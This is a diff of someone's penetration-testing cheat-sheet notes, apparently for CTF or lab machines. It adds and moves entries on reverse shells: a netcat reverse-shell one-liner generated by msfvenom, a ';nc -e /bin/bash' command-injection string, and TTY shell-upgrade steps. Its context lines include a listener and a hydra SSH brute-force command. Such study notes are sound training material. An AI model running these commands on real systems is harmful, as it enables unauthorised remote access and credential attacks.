@@ -74,13 +74,26 @@
 - op je eigen systeem `sudo nc -lvnp [port]`
 - maak een HTTP request naar de shell om hem te runnen
 
+#### Shell upgrade
+- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+- `export TERM=xterm`
+- Background: `Ctrl + Z`
+- `stty raw -echo; fg`
+- Note that if the shell dies, any input in your own terminal will not be visible. To fix this, type `reset` and press enter.
+
 #### Test command execution
 - start tcpdump listener for ICMP: `sudo tcpdump ip proto \\icmp -i tun0`
 - run command on target: `ping [local tun0 ip] -c 1`
 
+#### Reverse Shell with command injection
+- `;nc -e /bin/bash`
+
 #### Generate reverse shell command for Telnet
 - `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
 - result: `mkfifo /tmp/uxto; nc 10.9.222.201 4444 0</tmp/uxto | /bin/sh >/tmp/uxto 2>&1; rm /tmp/uxto`
+
+#### Reverse shell cheatsheet
+- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 ### SQLMap
 - copy login request from Burp
@@ -226,14 +239,6 @@
 
 ## Crypto
 - useful site: rumkin.com/tools
-
-## Reverse Shells
-- Pentestmonkey reverse shell cheatsheet
-- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
-- `export TERM=xterm`
-- Background: `Ctrl + Z`
-- `stty raw -echo; fg`
-- Note that if the shell dies, any input in your own terminal will not be visible. To fix this, type `reset` and press enter.
 
 ## SSH Brute Force
 - `hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.3.11 ssh`
